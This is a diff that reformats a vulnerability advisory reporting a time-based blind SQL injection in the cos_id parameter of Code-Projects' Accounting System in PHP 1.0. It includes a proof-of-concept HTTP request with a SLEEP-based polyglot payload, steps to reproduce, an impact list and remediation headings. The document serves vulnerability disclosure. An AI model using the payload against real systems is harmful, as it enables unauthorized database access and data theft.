@@ -1,28 +1,26 @@
-Time-Based Blind SQL Injection Accounting System in PHP in cos_id Parameter
+## Time-Based Blind SQL Injection Accounting System in PHP in cos_id Parameter
 
-Credit
-
+## Credit
 Discovered by:
 Ahmad Marzook
 
-
-Product
+## Product
 
 Accounting System in PHP
 
-Vendor
+## Vendor
 
 Code-Projects
 
-Vendor URL
+## Vendor URL
 
 https://code-projects.org/accounting-system-in-php-with-source-code/
 
-Affected Version
+## Affected Version
 
 1.0
 
-Vulnerability Type
+## Vulnerability Type
 
 SQL Injection (Time-Based Blind)
 
@@ -30,11 +28,11 @@ CWE
 
 CWE-89 – Improper Neutralization of Special Elements used in an SQL Command
 
-Severity
+## Severity
 
 High
 
-Description
+## Description
 
 The Accounting System in PHP 1.0 is vulnerable to a Time-Based Blind SQL Injection vulnerability in the cos_id parameter of the /my_account/delete.php endpoint. The application fails to properly validate and sanitize user-supplied input before including it in SQL queries executed by the backend database.
 
@@ -48,44 +46,31 @@ Successful exploitation may allow attackers to enumerate database structures, ex
 
 The vulnerability exists due to insufficient input validation and the absence of parameterized SQL queries when handling user-controlled input.
 
-Affected Endpoint
+## Affected Endpoint
 /my_account/delete.php
 Vulnerable Parameter
 cos_id
+####
 Proof of Concept
-
+```plain
 GET /my_account/delete.php?cos_id=(select(0)from(select(sleep(15)))v)%2f%2a'%2B(select(0)from(select(sleep(15)))v)%2B'%22%2B(select(0)from(select(sleep(15)))v)%2B%22%2a%2f HTTP/1.1
-
 Host: localhost
-
 sec-ch-ua: "Chromium";v="145", "Not:A-Brand";v="99"
-
 sec-ch-ua-mobile: ?0
-
 sec-ch-ua-platform: "macOS"
-
 Accept-Language: en-US,en;q=0.9
-
 Upgrade-Insecure-Requests: 1
-
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
-
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-
 Sec-Fetch-Site: same-origin
-
 Sec-Fetch-Mode: navigate
-
 Sec-Fetch-User: ?1
-
 Sec-Fetch-Dest: document
-
 Accept-Encoding: gzip, deflate, br
-
 Connection: keep-alive
+```
 
-
-Steps to Reproduce
+## Steps to Reproduce
 
 Install and run the Accounting System in PHP application.
 
@@ -99,13 +84,13 @@ Send the request to the server.
 
 Observe the server response time.
 
-Result
+## Result
 
 The server response is delayed by approximately 15 seconds, confirming that the injected SQL query containing the SLEEP(15) function is executed by the backend database.
 
 This demonstrates a Time-Based Blind SQL Injection vulnerability.
 
-Impact
+## Impact
 
 An attacker exploiting this vulnerability may be able to:
 
@@ -121,7 +106,7 @@ Potentially gain administrative access to the system
 
 In severe scenarios, attackers could fully compromise the application's database.
 
-Remediation
+## Remediation
 
 Developers should implement the following security measures:
 
